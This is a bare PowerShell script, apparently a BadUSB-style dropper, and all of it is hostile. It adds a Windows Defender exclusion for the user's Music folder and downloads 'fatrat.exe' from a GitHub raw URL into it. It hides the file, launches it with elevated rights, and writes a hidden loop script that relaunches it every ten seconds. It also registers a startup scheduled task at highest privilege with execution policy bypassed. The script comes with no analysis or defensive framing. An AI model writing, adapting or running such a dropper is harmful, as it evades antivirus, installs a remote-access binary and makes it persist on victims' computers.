Add-MpPreference -ExclusionPath "$env:USERPROFILE\Music"
Get-MpPreference | Select-Object -ExpandProperty ExclusionPath

$url = "https://github.com/armanina444/deadly-spark-attiny85/raw/refs/heads/main/fatrat.exe"
$dest = "$env:USERPROFILE\Music\fatrat.exe"

Invoke-WebRequest -Uri $url -OutFile $dest

Set-ItemProperty -Path $dest -Name Attributes -Value Hidden

Start-Process -FilePath $dest -Verb RunAs   



$script = Join-Path $env:USERPROFILE "Music\ratloop.ps1"


$loopContent = @"
\$exe = Join-Path \$env:USERPROFILE "Music\fatrat.exe"

while (\$true) {
    try {
        Start-Process -FilePath \$exe -WindowStyle Hidden
    }
    catch {}
    Start-Sleep -Seconds 10
}
"@


Set-Content -Path $script -Value $loopContent -Encoding UTF8


$action = New-ScheduledTaskAction `
    -Execute "powershell.exe" `
    -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$script`""


$trigger = New-ScheduledTaskTrigger -AtStartup


Register-ScheduledTask `
    -TaskName "FatratLoopTask" `
    -Action $action `
    -Trigger $trigger `
    -RunLevel Highest `
    -Force

Write-Host "fatratlooptask"
